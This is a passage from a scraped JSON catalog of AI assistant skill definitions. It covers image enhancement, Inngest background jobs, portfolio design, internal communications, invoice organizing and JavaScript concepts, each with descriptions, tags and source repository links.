      "content": "\n# Image Enhancer\n\nThis skill takes your images and screenshots and makes them look better—sharper, clearer, and more professional.\n\n## When to Use This Skill\n\n- Improving screenshot quality for blog posts or documentation\n- Enhancing images before sharing on social media\n- Preparing images for presentations or reports\n- Upscaling low-resolution images\n- Sharpening blurry photos\n- Cleaning up compressed images\n\n## What This Skill Does\n\n1. **Analyzes Image Quality**: Checks resolution, sharpness, and compression artifacts\n2. **Enhances Resolution**: Upscales images intelligently\n3. **Improves Sharpness**: Enhances edges and details\n4. **Reduces Artifacts**: Cleans up compression artifacts and noise\n5. **Optimizes for Use Case**: Adjusts based on intended use (web, print, social media)\n\n## How to Use\n\n### Basic Enhancement\n\n```\nImprove the image quality of screenshot.png\n```\n\n```\nEnhance all images in this folder\n```\n\n### Specific Improvements\n\n```\nUpscale this image to 4K resolution\n```\n\n```\nSharpen this blurry screenshot\n```\n\n```\nReduce compression artifacts in this image\n```\n\n### Batch Processing\n\n```\nImprove the quality of all PNG files in this directory\n```\n\n## Example\n\n**User**: \"Improve the image quality of screenshot-2024.png\"\n\n**Output**:\n```\nAnalyzing screenshot-2024.png...\n\nCurrent specs:\n- Resolution: 1920x1080\n- Format: PNG\n- Quality: Good, but slight blur\n\nEnhancements applied:\n✓ Upscaled to 2560x1440 (retina)\n✓ Sharpened edges\n✓ Enhanced text clarity\n✓ Optimized file size\n\nSaved as: screenshot-2024-enhanced.png\nOriginal preserved as: screenshot-2024-original.png\n```\n\n**Inspired by:** Lenny Rachitsky's workflow from his newsletter - used for screenshots in his articles\n\n## Tips\n\n- Always keeps original files as backup\n- Works best with screenshots and digital images\n- Can batch process entire folders\n- Specify output format if needed (PNG for quality, JPG for smaller size)\n- For social media, mention the platform for optimal sizing\n\n## Common Use Cases\n\n- **Blog Posts**: Enhance screenshots before publishing\n- **Documentation**: Make UI screenshots crystal clear\n- **Social Media**: Optimize images for Twitter, LinkedIn, Instagram\n- **Presentations**: Upscale images for large screens\n- **Print Materials**: Increase resolution for physical media\n\n",
      "tags": [
        "ai",
        "workflow",
        "image",
        "enhancer"
      ],
      "useCases": [
        "Improving screenshot quality for blog posts or documentation",
        "Enhancing images before sharing on social media",
        "Preparing images for presentations or reports",
        "Upscaling low-resolution images",
        "Sharpening blurry photos"
      ],
      "scrapedAt": "2026-01-26T13:15:49.124Z"
    },
    {
      "id": "antigravity-inngest",
      "name": "inngest",
      "slug": "inngest",
      "description": "Inngest expert for serverless-first background jobs, event-driven workflows, and durable execution without managing queues or workers. Use when: inngest, serverless background job, event-driven workflow, step function, durable execution.",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/inngest",
      "content": "\n# Inngest Integration\n\nYou are an Inngest expert who builds reliable background processing without\nmanaging infrastructure. You understand that serverless doesn't mean you can't\nhave durable, long-running workflows - it means you don't manage the workers.\n\nYou've built AI pipelines that take minutes, onboarding flows that span days,\nand event-driven systems that process millions of events. You know that the\nmagic of Inngest is in its steps - each one a checkpoint that survives failures.\n\nYour core philosophy:\n1. Event\n\n## Capabilities\n\n- inngest-functions\n- event-driven-workflows\n- step-functions\n- serverless-background-jobs\n- durable-sleep\n- fan-out-patterns\n- concurrency-control\n- scheduled-functions\n\n## Patterns\n\n### Basic Function Setup\n\nInngest function with typed events in Next.js\n\n### Multi-Step Workflow\n\nComplex workflow with parallel steps and error handling\n\n### Scheduled/Cron Functions\n\nFunctions that run on a schedule\n\n## Anti-Patterns\n\n### ❌ Not Using Steps\n\n### ❌ Huge Event Payloads\n\n### ❌ Ignoring Concurrency\n\n## Related Skills\n\nWorks well with: `nextjs-app-router`, `vercel-deployment`, `supabase-backend`, `email-systems`, `ai-agents-architect`, `stripe-integration`\n",
      "tags": [
        "nextjs",
        "ai",
        "agent",
        "workflow",
        "supabase",
        "stripe",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:19:02.776Z"
    },
    {
      "id": "antigravity-interactive-portfolio",
      "name": "interactive-portfolio",
      "slug": "interactive-portfolio",
      "description": "Expert in building portfolios that actually land jobs and clients - not just showing work, but creating memorable experiences. Covers developer portfolios, designer portfolios, creative portfolios, and portfolios that convert visitors into opportunities. Use when: portfolio, personal website, showca",
      "category": "Creative & Media",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/interactive-portfolio",
      "content": "\n# Interactive Portfolio\n\n**Role**: Portfolio Experience Designer\n\nYou know a portfolio isn't a resume - it's a first impression that needs\nto convert. You balance creativity with usability. You understand that\nhiring managers spend 30 seconds on each portfolio. You make those 30\nseconds count. You help people stand out without being gimmicky.\n\n## Capabilities\n\n- Portfolio architecture\n- Project showcase design\n- Interactive case studies\n- Personal branding for devs/designers\n- Contact conversion\n- Portfolio performance\n- Work presentation\n- Testimonial integration\n\n## Patterns\n\n### Portfolio Architecture\n\nStructure that works for portfolios\n\n**When to use**: When planning portfolio structure\n\n```javascript\n## Portfolio Architecture\n\n### The 30-Second Test\nIn 30 seconds, visitors should know:\n1. Who you are\n2. What you do\n3. Your best work\n4. How to contact you\n\n### Essential Sections\n| Section | Purpose | Priority |\n|---------|---------|----------|\n| Hero | Hook + identity | Critical |\n| Work/Projects | Prove skills | Critical |\n| About | Personality + story | Important |\n| Contact | Convert interest | Critical |\n| Testimonials | Social proof | Nice to have |\n| Blog/Writing | Thought leadership | Optional |\n\n### Navigation Patterns\n```\nOption 1: Single page scroll\n- Best for: Designers, creatives\n- Works well with animations\n- Mobile friendly\n\nOption 2: Multi-page\n- Best for: Lots of projects\n- Individual case study pages\n- Better for SEO\n\nOption 3: Hybrid\n- Main sections on one page\n- Detailed case studies separate\n- Best of both worlds\n```\n\n### Hero Section Formula\n```\n[Your name]\n[What you do in one line]\n[One line that differentiates you]\n[CTA: View Work / Contact]\n```\n```\n\n### Project Showcase\n\nHow to present work effectively\n\n**When to use**: When building project sections\n\n```javascript\n## Project Showcase\n\n### Project Card Elements\n| Element | Purpose |\n|---------|---------|\n| Thumbnail | Visual hook |\n| Title | What it is |\n| One-liner | What you did |\n| Tech/tags | Quick scan |\n| Results | Proof of impact |\n\n### Case Study Structure\n```\n1. Hero image/video\n2. Project overview (2-3 sentences)\n3. The challenge\n4. Your role\n5. Process highlights\n6. Key decisions\n7. Results/impact\n8. Learnings (optional)\n9. Links (live, GitHub, etc.)\n```\n\n### Showing Impact\n| Instead of | Write |\n|------------|-------|\n| \"Built a website\" | \"Increased conversions 40%\" |\n| \"Designed UI\" | \"Reduced user drop-off 25%\" |\n| \"Developed features\" | \"Shipped to 50K users\" |\n\n### Visual Presentation\n- Device mockups for web/mobile\n- Before/after comparisons\n- Process artifacts (wireframes, etc.)\n- Video walkthroughs for complex work\n- Hover effects for engagement\n```\n\n### Developer Portfolio Specifics\n\nWhat works for dev portfolios\n\n**When to use**: When building developer portfolio\n\n```javascript\n## Developer Portfolio\n\n### What Hiring Managers Look For\n1. Code quality (GitHub link)\n2. Real projects (not just tutorials)\n3. Problem-solving ability\n4. Communication skills\n5. Technical depth\n\n### Must-Haves\n- GitHub profile link (cleaned up)\n- Live project links\n- Tech stack for each project\n- Your specific contribution (for team projects)\n\n### Project Selection\n| Include | Avoid |\n|---------|-------|\n| Real problems solved | Tutorial clones |\n| Side projects with users | Incomplete projects |\n| Open source contributions | \"Coming soon\" |\n| Technical challenges | Basic CRUD apps |\n\n### Technical Showcase\n```javascript\n// Show code snippets that demonstrate:\n- Clean architecture decisions\n- Performance optimizations\n- Clever solutions\n- Testing approach\n```\n\n### Blog/Writing\n- Technical deep dives\n- Problem-solving stories\n- Learning journeys\n- Shows communication skills\n```\n\n## Anti-Patterns\n\n### ❌ Template Portfolio\n\n**Why bad**: Looks like everyone else.\nNo memorable impression.\nDoesn't show creativity.\nEasy to forget.\n\n**Instead**: Add personal touches.\nCustom design elements.\nUnique project presentations.\nYour voice in the copy.\n\n### ❌ All Style No Substance\n\n**Why bad**: Fancy animations, weak projects.\nStyle over substance.\nHiring managers see through it.\nNo proof of skills.\n\n**Instead**: Projects first, style second.\nReal work with real impact.\nQuality over quantity.\nDepth over breadth.\n\n### ❌ Resume Website\n\n**Why bad**: Boring, forgettable.\nDoesn't use the medium.\nNo personality.\nLists instead of stories.\n\n**Instead**: Show, don't tell.\nVisual case studies.\nInteractive elements.\nPersonality throughout.\n\n## ⚠️ Sharp Edges\n\n| Issue | Severity | Solution |\n|-------|----------|----------|\n| Portfolio more complex than your actual work | medium | ## Right-Sizing Your Portfolio |\n| Portfolio looks great on desktop, broken on mobile | high | ## Mobile-First Portfolio |\n| Visitors don't know what to do next | medium | ## Portfolio CTAs |\n| Portfolio shows old or irrelevant work | medium | ## Portfolio Freshness |\n\n## Related Skills\n\nWorks well with: `scroll-experience`, `3d-web-experience`, `landing-page-design`, `personal-bra",
      "tags": [
        "javascript",
        "ai",
        "template",
        "design",
        "presentation",
        "image",
        "seo",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:19:03.957Z"
    },
    {
      "id": "anthropic-internal-comms",
      "name": "internal-comms",
      "slug": "internal-comms",
      "description": "A set of resources to help me write all kinds of internal communications, using the formats that my company likes to use. Claude should use this skill whenever asked to write some sort of internal communications (status reports, leadership updates, 3P updates, company newsletters, FAQs, incident reports, project updates, etc.).",
      "category": "Communication & Writing",
      "source": "anthropic",
      "repoUrl": "https://github.com/anthropics/skills",
      "skillUrl": "https://github.com/anthropics/skills/tree/main/skills/internal-comms",
      "content": "\n## When to use this skill\nTo write internal communications, use this skill for:\n- 3P updates (Progress, Plans, Problems)\n- Company newsletters\n- FAQ responses\n- Status reports\n- Leadership updates\n- Project updates\n- Incident reports\n\n## How to use this skill\n\nTo write any internal communication:\n\n1. **Identify the communication type** from the request\n2. **Load the appropriate guideline file** from the `examples/` directory:\n    - `examples/3p-updates.md` - For Progress/Plans/Problems team updates\n    - `examples/company-newsletter.md` - For company-wide newsletters\n    - `examples/faq-answers.md` - For answering frequently asked questions\n    - `examples/general-comms.md` - For anything else that doesn't explicitly match one of the above\n3. **Follow the specific instructions** in that file for formatting, tone, and content gathering\n\nIf the communication type doesn't match any existing guideline, ask for clarification or more context about the desired format.\n\n## Keywords\n3P updates, company newsletter, company comms, weekly update, faqs, common questions, updates, internal comms\n",
      "tags": [
        "claude"
      ],
      "useCases": [
        "3P updates (Progress, Plans, Problems)",
        "Company newsletters",
        "FAQ responses",
        "Status reports",
        "Leadership updates"
      ],
      "scrapedAt": "2026-01-26T13:14:36.241Z"
    },
    {
      "id": "awesome-llm-internal-comms",
      "name": "internal-comms",
      "slug": "awesome-llm-internal-comms",
      "description": "A set of resources to help me write all kinds of internal communications, using the formats that my company likes to use. Claude should use this skill whenever asked to write some sort of internal communications (status reports, leadership updates, 3P updates, company newsletters, FAQs, incident rep",
      "category": "Business & Marketing",
      "source": "awesome-llm",
      "repoUrl": "https://github.com/Prat011/awesome-llm-skills",
      "skillUrl": "https://github.com/Prat011/awesome-llm-skills/tree/master/internal-comms",
      "content": "\n## When to use this skill\nTo write internal communications, use this skill for:\n- 3P updates (Progress, Plans, Problems)\n- Company newsletters\n- FAQ responses\n- Status reports\n- Leadership updates\n- Project updates\n- Incident reports\n\n## How to use this skill\n\nTo write any internal communication:\n\n1. **Identify the communication type** from the request\n2. **Load the appropriate guideline file** from the `examples/` directory:\n    - `examples/3p-updates.md` - For Progress/Plans/Problems team updates\n    - `examples/company-newsletter.md` - For company-wide newsletters\n    - `examples/faq-answers.md` - For answering frequently asked questions\n    - `examples/general-comms.md` - For anything else that doesn't explicitly match one of the above\n3. **Follow the specific instructions** in that file for formatting, tone, and content gathering\n\nIf the communication type doesn't match any existing guideline, ask for clarification or more context about the desired format.\n\n## Keywords\n3P updates, company newsletter, company comms, weekly update, faqs, common questions, updates, internal comms\n",
      "tags": [
        "claude",
        "internal",
        "comms"
      ],
      "useCases": [
        "3P updates (Progress, Plans, Problems)",
        "Company newsletters",
        "FAQ responses",
        "Status reports",
        "Leadership updates"
      ],
      "scrapedAt": "2026-01-26T13:15:50.378Z"
    },
    {
      "id": "antigravity-internal-comms-anthropic",
      "name": "internal-comms",
      "slug": "internal-comms-anthropic",
      "description": "A set of resources to help me write all kinds of internal communications, using the formats that my company likes to use. Claude should use this skill whenever asked to write some sort of internal communications (status reports, leadership updates, 3P updates, company newsletters, FAQs, incident rep",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/internal-comms-anthropic",
      "content": "\n## When to use this skill\nTo write internal communications, use this skill for:\n- 3P updates (Progress, Plans, Problems)\n- Company newsletters\n- FAQ responses\n- Status reports\n- Leadership updates\n- Project updates\n- Incident reports\n\n## How to use this skill\n\nTo write any internal communication:\n\n1. **Identify the communication type** from the request\n2. **Load the appropriate guideline file** from the `examples/` directory:\n    - `examples/3p-updates.md` - For Progress/Plans/Problems team updates\n    - `examples/company-newsletter.md` - For company-wide newsletters\n    - `examples/faq-answers.md` - For answering frequently asked questions\n    - `examples/general-comms.md` - For anything else that doesn't explicitly match one of the above\n3. **Follow the specific instructions** in that file for formatting, tone, and content gathering\n\nIf the communication type doesn't match any existing guideline, ask for clarification or more context about the desired format.\n\n## Keywords\n3P updates, company newsletter, company comms, weekly update, faqs, common questions, updates, internal comms\n",
      "tags": [
        "claude"
      ],
      "useCases": [
        "3P updates (Progress, Plans, Problems)",
        "Company newsletters",
        "FAQ responses",
        "Status reports",
        "Leadership updates"
      ],
      "scrapedAt": "2026-01-26T13:19:05.199Z"
    },
    {
      "id": "antigravity-internal-comms-community",
      "name": "internal-comms",
      "slug": "internal-comms-community",
      "description": "A set of resources to help me write all kinds of internal communications, using the formats that my company likes to use. Claude should use this skill whenever asked to write some sort of internal communications (status reports, leadership updates, 3P updates, company newsletters, FAQs, incident rep",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/internal-comms-community",
      "content": "\n## When to use this skill\nTo write internal communications, use this skill for:\n- 3P updates (Progress, Plans, Problems)\n- Company newsletters\n- FAQ responses\n- Status reports\n- Leadership updates\n- Project updates\n- Incident reports\n\n## How to use this skill\n\nTo write any internal communication:\n\n1. **Identify the communication type** from the request\n2. **Load the appropriate guideline file** from the `examples/` directory:\n    - `examples/3p-updates.md` - For Progress/Plans/Problems team updates\n    - `examples/company-newsletter.md` - For company-wide newsletters\n    - `examples/faq-answers.md` - For answering frequently asked questions\n    - `examples/general-comms.md` - For anything else that doesn't explicitly match one of the above\n3. **Follow the specific instructions** in that file for formatting, tone, and content gathering\n\nIf the communication type doesn't match any existing guideline, ask for clarification or more context about the desired format.\n\n## Keywords\n3P updates, company newsletter, company comms, weekly update, faqs, common questions, updates, internal comms\n",
      "tags": [
        "claude"
      ],
      "useCases": [
        "3P updates (Progress, Plans, Problems)",
        "Company newsletters",
        "FAQ responses",
        "Status reports",
        "Leadership updates"
      ],
      "scrapedAt": "2026-01-26T13:19:07.404Z"
    },
    {
      "id": "composio-invoice-organizer",
      "name": "invoice-organizer",
      "slug": "invoice-organizer",
      "description": "Automatically organizes invoices and receipts for tax preparation by reading messy files, extracting key information, renaming them consistently, and sorting them into logical folders. Turns hours of manual bookkeeping into minutes of automated organization.",
      "category": "Productivity & Organization",
      "source": "composio",
      "repoUrl": "https://github.com/ComposioHQ/awesome-claude-skills",
      "skillUrl": "https://github.com/ComposioHQ/awesome-claude-skills/tree/master/invoice-organizer",
      "content": "\n# Invoice Organizer\n\nThis skill transforms chaotic folders of invoices, receipts, and financial documents into a clean, tax-ready filing system without manual effort.\n\n## When to Use This Skill\n\n- Preparing for tax season and need organized records\n- Managing business expenses across multiple vendors\n- Organizing receipts from a messy folder or email downloads\n- Setting up automated invoice filing for ongoing bookkeeping\n- Archiving financial records by year or category\n- Reconciling expenses for reimbursement\n- Preparing documentation for accountants\n\n## What This Skill Does\n\n1. **Reads Invoice Content**: Extracts information from PDFs, images, and documents:\n   - Vendor/company name\n   - Invoice number\n   - Date\n   - Amount\n   - Product or service description\n   - Payment method\n\n2. **Renames Files Consistently**: Creates standardized filenames:\n   - Format: `YYYY-MM-DD Vendor - Invoice - ProductOrService.pdf`\n   - Examples: `2024-03-15 Adobe - Invoice - Creative Cloud.pdf`\n\n3. **Organizes by Category**: Sorts into logical folders:\n   - By vendor\n   - By expense category (software, office, travel, etc.)\n   - By time period (year, quarter, month)\n   - By tax category (deductible, personal, etc.)\n\n4. **Handles Multiple Formats**: Works with:\n   - PDF invoices\n   - Scanned receipts (JPG, PNG)\n   - Email attachments\n   - Screenshots\n   - Bank statements\n\n5. **Maintains Originals**: Preserves original files while organizing copies\n\n## How to Use\n\n### Basic Usage\n\nNavigate to your messy invoice folder:\n```\ncd ~/Desktop/receipts-to-sort\n```\n\nThen ask Claude Code:\n```\nOrganize these invoices for taxes\n```\n\nOr more specifically:\n```\nRead all invoices in this folder, rename them to \n\"YYYY-MM-DD Vendor - Invoice - Product.pdf\" format, \nand organize them by vendor\n```\n\n### Advanced Organization\n\n```\nOrganize these invoices:\n1. Extract date, vendor, and description from each file\n2. Rename to standard format\n3. Sort into folders by expense category (Software, Office, Travel, etc.)\n4. Create a CSV spreadsheet with all invoice details for my accountant\n```\n\n## Instructions\n\nWhen a user requests invoice organization:\n\n1. **Scan the Folder**\n   \n   Identify all invoice files:\n   ```bash\n   # Find all invoice-related files\n   find . -type f \\( -name \"*.pdf\" -o -name \"*.jpg\" -o -name \"*.png\" \\) -print\n   ```\n   \n   Report findings:\n   - Total number of files\n   - File types\n   - Date range (if discernible from names)\n   - Current organization (or lack thereof)\n\n2. **Extract Information from Each File**\n   \n   For each invoice, extract:\n   \n   **From PDF invoices**:\n   - Use text extraction to read invoice content\n   - Look for common patterns:\n     - \"Invoice Date:\", \"Date:\", \"Issued:\"\n     - \"Invoice #:\", \"Invoice Number:\"\n     - Company name (usually at top)\n     - \"Amount Due:\", \"Total:\", \"Amount:\"\n     - \"Description:\", \"Service:\", \"Product:\"\n   \n   **From image receipts**:\n   - Read visible text from images\n   - Identify vendor name (often at top)\n   - Look for date (common formats)\n   - Find total amount\n   \n   **Fallback for unclear files**:\n   - Use filename clues\n   - Check file creation/modification date\n   - Flag for manual review if critical info missing\n\n3. **Determine Organization Strategy**\n   \n   Ask user preference if not specified:\n   \n   ```markdown\n   I found [X] invoices from [date range].\n   \n   How would you like them organized?\n   \n   1. **By Vendor** (Adobe/, Amazon/, Stripe/, etc.)\n   2. **By Category** (Software/, Office Supplies/, Travel/, etc.)\n   3. **By Date** (2024/Q1/, 2024/Q2/, etc.)\n   4. **By Tax Category** (Deductible/, Personal/, etc.)\n   5. **Custom** (describe your structure)\n   \n   Or I can use a default structure: Year/Category/Vendor\n   ```\n\n4. **Create Standardized Filename**\n   \n   For each invoice, create a filename following this pattern:\n   \n   ```\n   YYYY-MM-DD Vendor - Invoice - Description.ext\n   ```\n   \n   Examples:\n   - `2024-03-15 Adobe - Invoice - Creative Cloud.pdf`\n   - `2024-01-10 Amazon - Receipt - Office Supplies.pdf`\n   - `2023-12-01 Stripe - Invoice - Monthly Payment Processing.pdf`\n   \n   **Filename Best Practices**:\n   - Remove special characters except hyphens\n   - Capitalize vendor names properly\n   - Keep descriptions concise but meaningful\n   - Use consistent date format (YYYY-MM-DD) for sorting\n   - Preserve original file extension\n\n5. **Execute Organization**\n   \n   Before moving files, show the plan:\n   \n   ```markdown\n   # Organization Plan\n   \n   ## Proposed Structure\n   ```\n   Invoices/\n   ├── 2023/\n   │   ├── Software/\n   │   │   ├── Adobe/\n   │   │   └── Microsoft/\n   │   ├── Services/\n   │   └── Office/\n   └── 2024/\n       ├── Software/\n       ├── Services/\n       └── Office/\n   ```\n   \n   ## Sample Changes\n   \n   Before: `invoice_adobe_march.pdf`\n   After: `2024-03-15 Adobe - Invoice - Creative Cloud.pdf`\n   Location: `Invoices/2024/Software/Adobe/`\n   \n   Before: `IMG_2847.jpg`\n   After: `2024-02-10 Staples - Receipt - Office Supplies.jpg`\n   Lo",
      "tags": [
        "api",
        "gmail",
        "pdf",
        "markdown",
        "automation",
        "ai",
        "claude"
      ],
      "useCases": [
        "Preparing for tax season and need organized records",
        "Managing business expenses across multiple vendors",
        "Organizing receipts from a messy folder or email downloads",
        "Setting up automated invoice filing for ongoing bookkeeping",
        "Archiving financial records by year or category"
      ],
      "instructions": "When a user requests invoice organization:\n\n1. **Scan the Folder**\n   \n   Identify all invoice files:\n   ```bash\n   # Find all invoice-related files\n   find . -type f \\( -name \"*.pdf\" -o -name \"*.jpg\" -o -name \"*.png\" \\) -print\n   ```\n   \n   Report findings:\n   - Total number of files\n   - File types\n   - Date range (if discernible from names)\n   - Current organization (or lack thereof)\n\n2. **Extract Information from Each File**\n   \n   For each invoice, extract:\n   \n   **From PDF invoices**:\n   - Use text extraction to read invoice content\n   - Look for common patterns:\n     - \"Invoice Date:\", \"Date:\", \"Issued:\"\n     - \"Invoice #:\", \"Invoice Number:\"\n     - Company name (usually at top)\n     - \"Amount Due:\", \"Total:\", \"Amount:\"\n     - \"Description:\", \"Service:\", \"Product:\"\n   \n   **From image receipts**:\n   - Read visible text from images\n   - Identify vendor name (often at top)\n   - Look for date (common formats)\n   - Find total amount\n   \n   **Fallback for unclear files**:\n   - Use filename clues\n   - Check file creation/modification date\n   - Flag for manual review if critical info missing\n\n3. **Determine Organization Strategy**\n   \n   Ask user preference if not specified:\n   \n   ```markdown\n   I found [X] invoices from [date range].\n   \n   How would you like them organized?\n   \n   1. **By Vendor** (Adobe/, Amazon/, Stripe/, etc.)\n   2. **By Category** (Software/, Office Supplies/, Travel/, etc.)\n   3. **By Date** (2024/Q1/, 2024/Q2/, etc.)\n   4. **By Tax Category** (Deductible/, Personal/, etc.)\n   5. **Custom** (describe your structure)\n   \n   Or I can use a default structure: Year/Category/Vendor\n   ```\n\n4. **Create Standardized Filename**\n   \n   For each invoice, create a filename following this pattern:\n   \n   ```\n   YYYY-MM-DD Vendor - Invoice - Description.ext\n   ```\n   \n   Examples:\n   - `2024-03-15 Adobe - Invoice - Creative Cloud.pdf`\n   - `2024-01-10 Amazon - Receipt - Office Supplies.pdf`\n   - `2023-12-01 Stripe - Invoice - Monthly Payment Processing.",
      "scrapedAt": "2026-01-26T13:15:08.828Z"
    },
    {
      "id": "awesome-llm-invoice-organizer",
      "name": "invoice-organizer",
      "slug": "awesome-llm-invoice-organizer",
      "description": "Automatically organizes invoices and receipts for tax preparation by reading messy files, extracting key information, renaming them consistently, and sorting them into logical folders. Turns hours of manual bookkeeping into minutes of automated organization.",
      "category": "Productivity & Organization",
      "source": "awesome-llm",
      "repoUrl": "https://github.com/Prat011/awesome-llm-skills",
      "skillUrl": "https://github.com/Prat011/awesome-llm-skills/tree/master/invoice-organizer",
      "content": "\n# Invoice Organizer\n\nThis skill transforms chaotic folders of invoices, receipts, and financial documents into a clean, tax-ready filing system without manual effort.\n\n## When to Use This Skill\n\n- Preparing for tax season and need organized records\n- Managing business expenses across multiple vendors\n- Organizing receipts from a messy folder or email downloads\n- Setting up automated invoice filing for ongoing bookkeeping\n- Archiving financial records by year or category\n- Reconciling expenses for reimbursement\n- Preparing documentation for accountants\n\n## What This Skill Does\n\n1. **Reads Invoice Content**: Extracts information from PDFs, images, and documents:\n   - Vendor/company name\n   - Invoice number\n   - Date\n   - Amount\n   - Product or service description\n   - Payment method\n\n2. **Renames Files Consistently**: Creates standardized filenames:\n   - Format: `YYYY-MM-DD Vendor - Invoice - ProductOrService.pdf`\n   - Examples: `2024-03-15 Adobe - Invoice - Creative Cloud.pdf`\n\n3. **Organizes by Category**: Sorts into logical folders:\n   - By vendor\n   - By expense category (software, office, travel, etc.)\n   - By time period (year, quarter, month)\n   - By tax category (deductible, personal, etc.)\n\n4. **Handles Multiple Formats**: Works with:\n   - PDF invoices\n   - Scanned receipts (JPG, PNG)\n   - Email attachments\n   - Screenshots\n   - Bank statements\n\n5. **Maintains Originals**: Preserves original files while organizing copies\n\n## How to Use\n\n### Basic Usage\n\nNavigate to your messy invoice folder:\n```\ncd ~/Desktop/receipts-to-sort\n```\n\nThen ask Claude Code:\n```\nOrganize these invoices for taxes\n```\n\nOr more specifically:\n```\nRead all invoices in this folder, rename them to \n\"YYYY-MM-DD Vendor - Invoice - Product.pdf\" format, \nand organize them by vendor\n```\n\n### Advanced Organization\n\n```\nOrganize these invoices:\n1. Extract date, vendor, and description from each file\n2. Rename to standard format\n3. Sort into folders by expense category (Software, Office, Travel, etc.)\n4. Create a CSV spreadsheet with all invoice details for my accountant\n```\n\n## Instructions\n\nWhen a user requests invoice organization:\n\n1. **Scan the Folder**\n   \n   Identify all invoice files:\n   ```bash\n   # Find all invoice-related files\n   find . -type f \\( -name \"*.pdf\" -o -name \"*.jpg\" -o -name \"*.png\" \\) -print\n   ```\n   \n   Report findings:\n   - Total number of files\n   - File types\n   - Date range (if discernible from names)\n   - Current organization (or lack thereof)\n\n2. **Extract Information from Each File**\n   \n   For each invoice, extract:\n   \n   **From PDF invoices**:\n   - Use text extraction to read invoice content\n   - Look for common patterns:\n     - \"Invoice Date:\", \"Date:\", \"Issued:\"\n     - \"Invoice #:\", \"Invoice Number:\"\n     - Company name (usually at top)\n     - \"Amount Due:\", \"Total:\", \"Amount:\"\n     - \"Description:\", \"Service:\", \"Product:\"\n   \n   **From image receipts**:\n   - Read visible text from images\n   - Identify vendor name (often at top)\n   - Look for date (common formats)\n   - Find total amount\n   \n   **Fallback for unclear files**:\n   - Use filename clues\n   - Check file creation/modification date\n   - Flag for manual review if critical info missing\n\n3. **Determine Organization Strategy**\n   \n   Ask user preference if not specified:\n   \n   ```markdown\n   I found [X] invoices from [date range].\n   \n   How would you like them organized?\n   \n   1. **By Vendor** (Adobe/, Amazon/, Stripe/, etc.)\n   2. **By Category** (Software/, Office Supplies/, Travel/, etc.)\n   3. **By Date** (2024/Q1/, 2024/Q2/, etc.)\n   4. **By Tax Category** (Deductible/, Personal/, etc.)\n   5. **Custom** (describe your structure)\n   \n   Or I can use a default structure: Year/Category/Vendor\n   ```\n\n4. **Create Standardized Filename**\n   \n   For each invoice, create a filename following this pattern:\n   \n   ```\n   YYYY-MM-DD Vendor - Invoice - Description.ext\n   ```\n   \n   Examples:\n   - `2024-03-15 Adobe - Invoice - Creative Cloud.pdf`\n   - `2024-01-10 Amazon - Receipt - Office Supplies.pdf`\n   - `2023-12-01 Stripe - Invoice - Monthly Payment Processing.pdf`\n   \n   **Filename Best Practices**:\n   - Remove special characters except hyphens\n   - Capitalize vendor names properly\n   - Keep descriptions concise but meaningful\n   - Use consistent date format (YYYY-MM-DD) for sorting\n   - Preserve original file extension\n\n5. **Execute Organization**\n   \n   Before moving files, show the plan:\n   \n   ```markdown\n   # Organization Plan\n   \n   ## Proposed Structure\n   ```\n   Invoices/\n   ├── 2023/\n   │   ├── Software/\n   │   │   ├── Adobe/\n   │   │   └── Microsoft/\n   │   ├── Services/\n   │   └── Office/\n   └── 2024/\n       ├── Software/\n       ├── Services/\n       └── Office/\n   ```\n   \n   ## Sample Changes\n   \n   Before: `invoice_adobe_march.pdf`\n   After: `2024-03-15 Adobe - Invoice - Creative Cloud.pdf`\n   Location: `Invoices/2024/Software/Adobe/`\n   \n   Before: `IMG_2847.jpg`\n   After: `2024-02-10 Staples - Receipt - Office Supplies.jpg`\n   Lo",
      "tags": [
        "pdf",
        "markdown",
        "api",
        "claude",
        "ai",
        "automation",
        "image",
        "invoice",
        "organizer"
      ],
      "useCases": [
        "Preparing for tax season and need organized records",
        "Managing business expenses across multiple vendors",
        "Organizing receipts from a messy folder or email downloads",
        "Setting up automated invoice filing for ongoing bookkeeping",
        "Archiving financial records by year or category"
      ],
      "scrapedAt": "2026-01-26T13:15:51.638Z"
    },
    {
      "id": "antigravity-javascript-mastery",
      "name": "javascript-mastery",
      "slug": "javascript-mastery",
      "description": "Comprehensive JavaScript reference covering 33+ essential concepts every developer should know. From fundamentals like primitives and closures to advanced patterns like async/await and functional programming. Use when explaining JS concepts, debugging JavaScript issues, or teaching JavaScript fundam",
      "category": "Development & Code Tools",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/javascript-mastery",
      "content": "\n# 🧠 JavaScript Mastery\n\n> 33+ essential JavaScript concepts every developer should know, inspired by [33-js-concepts](https://github.com/leonardomso/33-js-concepts).\n\n## When to Use This Skill\n\nUse this skill when:\n\n- Explaining JavaScript concepts\n- Debugging tricky JS behavior\n- Teaching JavaScript fundamentals\n- Reviewing code for JS best practices\n- Understanding language quirks\n\n---\n\n## 1. Fundamentals\n\n### 1.1 Primitive Types\n\nJavaScript has 7 primitive types:\n\n```javascript\n// String\nconst str = \"hello\";\n\n// Number (integers and floats)\nconst num = 42;\nconst float = 3.14;\n\n// BigInt (for large integers)\nconst big = 9007199254740991n;\n\n// Boolean\nconst bool = true;\n\n// Undefined\nlet undef; // undefined\n\n// Null\nconst empty = null;\n\n// Symbol (unique identifiers)\nconst sym = Symbol(\"description\");\n```\n\n**Key points**:\n\n- Primitives are immutable\n- Passed by value\n- `typeof null === \"object\"` is a historical bug\n\n### 1.2 Type Coercion\n\nJavaScript implicitly converts types:\n\n```javascript\n// String coercion\n\"5\" + 3; // \"53\" (number → string)\n\"5\" - 3; // 2    (string → 